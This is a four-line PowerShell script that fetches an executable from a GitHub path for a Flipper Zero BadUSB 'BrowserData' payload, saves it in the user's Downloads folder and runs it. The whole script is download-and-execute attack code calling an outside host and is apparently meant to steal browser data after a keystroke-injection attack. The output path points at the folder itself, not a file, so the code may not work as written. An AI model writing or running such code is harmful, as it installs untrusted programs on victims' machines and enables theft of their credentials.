$url = "https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
$destination = [System.IO.Path]::Combine($env:UserProfile, 'Downloads')
Invoke-WebRequest -Uri $url -OutFile $destination
Start-Process -FilePath $destination -Wait